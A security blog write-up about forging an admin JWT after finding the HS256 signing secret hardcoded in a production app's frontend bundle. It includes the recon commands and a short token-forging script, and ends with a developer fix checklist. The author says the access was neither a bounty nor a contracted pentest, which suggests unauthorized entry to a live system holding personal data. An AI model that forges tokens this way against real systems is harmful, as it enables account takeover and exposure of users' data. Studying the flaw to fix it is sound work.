# 🔓 JavaScript, JWT and the Key That Shouldn’t Exist

**Aditya Bhatt** | *VAPT Specialist | Security Writer | JWT Whisperer*

![Coverr](https://github.com/user-attachments/assets/145197d0-adba-4834-961a-4ce46bacfb92) <br/>

---

## 🧠 The Premise

Some hacks don’t require zero-days, exploit chains, or elite tooling.

Sometimes, all you need is a poorly written `auth.js`, a public-facing JavaScript bundle, and a little bit of curiosity.

This is the story of how a **JWT signing secret exposed in frontend JavaScript** gave me full admin access on a live production system — and how it could’ve been avoided with one line of `.env`.

---

## 🧭 Phase 1: Typical Recon, Unexpected Treasure

The target app had:

* JWT-based authentication
* A React frontend and Node.js backend
* Basic login/signup, user dashboard, admin panel (403 if unauthorized)

I started the recon as usual — no XSS, no IDOR, no SSRF.
So I popped open DevTools and started combing through loaded JS bundles.

```bash
curl https://target.com/static/js/main.ab13c7.js -o bundle.js
```

Then I searched for keywords: `secret`, `token`, `jwt`, `key`, `sign`.

And there it was:

```js
// utils/auth.js
const secret = "JWT_SUPER_SECRET_12345"; // TODO: move this to .env
```

🎯 **This was the real HS256 signing key** — exposed, hardcoded, and usable.

---

## 🧬 Phase 2: Token Decoding & Forging

I logged in as a normal user and fetched the JWT token from `LocalStorage` via DevTools.

Decoded the payload:

```json
{
  "user": "testuser",
  "role": "user"
}
```

Now with the exposed secret in hand, I forged a new token using Node.js:

```js
const jwt = require("jsonwebtoken");

const token = jwt.sign(
  { user: "admin", role: "admin" },
  "JWT_SUPER_SECRET_12345",
  { algorithm: "HS256" }
);

console.log(token);
```

Replaced the existing JWT in LocalStorage with the forged one, refreshed `/admin`…

💥 Full admin access. Just like that.

---

## 💣 Phase 3: Escalation & What I Could Access

Inside the admin panel:

* User management (reset passwords, change roles)
* PII dump (emails, contact info, access logs)
* Debug console (run limited internal queries)
* Moderation tools (create notices, trigger webhooks)
* Stored XSS injection points through WYSIWYG editor

No IP block. No CAPTCHA. No server-side validation of claims.

JWT token = access. That's it.

---

## 🎯 Why This Happens (And Often)

* Developers **misunderstand JWT as a magic bullet**, assuming if it's signed, it's safe
* HS256 (symmetric key) is widely used — **but if the key leaks, it’s game over**
* Frontend code is often minified, but **never truly hidden**
* Teams forget to migrate secrets from test → prod → CI/CD securely
* There's **little to no token validation on the backend** beyond signature

---

## 📚 Want to Learn More About JWT Attacks?

This incident was one of many, and if you’re into JWT hacking, I’ve written a **dedicated guide series** for it:

🔗 **[Cracking JWTs: A Bug Bounty Hunting Guide](https://medium.com/@adityabhatt3010/list/cracking-jwts-a-bug-bounty-hunting-guide-289859dc4985)**

Inside you'll find:

* `none` algorithm bypass attacks
* RS256 to HS256 downgrade flaws
* JWT brute-force tooling like `jwt_tool` and `john`
* Common misconfigurations in libraries like `jsonwebtoken`, Auth0, Firebase
* Real-world POCs and red-team tips

Whether you’re a hunter or a dev, this guide covers **everything attackers exploit — and how to fix it.**

---

## 🛠️ Developer Fix Checklist

If you're a dev reading this — here’s how you don’t become the next Medium article:

* 🔒 **Never hardcode secrets** in frontend JS — ever
* 📦 Use `.env` files with `dotenv` and secure CI/CD handling
* 🔁 Rotate your JWT secrets periodically
* 🔐 Use **RS256** (asymmetric) signing instead of **HS256**
* ✅ Always verify the **claims** (`role`, `user_id`, `scope`) on the backend
* ⏱️ Set expiration times and implement token revocation logic

---

## 🧠 Final Thoughts

This wasn't a bounty report. This wasn’t a live pentest contract.

This was simply the result of **reading what most people ignore** — and trusting that the most dangerous vulnerabilities are often **hidden in plain sight**.

> “JWTs are like signed permission slips. But when the teacher signs it with a Sharpie on the class board, everyone gets an A+.”

---

🦇 **Catch more** practical writeups, tools, and exploit chains here: <br/>
🧠 [Medium: Cracking JWTs Series](https://medium.com/@adityabhatt3010/list/cracking-jwts-a-bug-bounty-hunting-guide-289859dc4985) <br/>
🔗 GitHub: [@AdityaBhatt3010](https://github.com/AdityaBhatt3010) <br/>
✍️ Medium: [@adityabhatt3010](https://medium.com/@adityabhatt3010) <br/>
💼 LinkedIn: [Aditya Bhatt](https://www.linkedin.com/in/adityabhatt3010) <br/>

Got an idea or story worth publishing together?
Let’s build it.

---
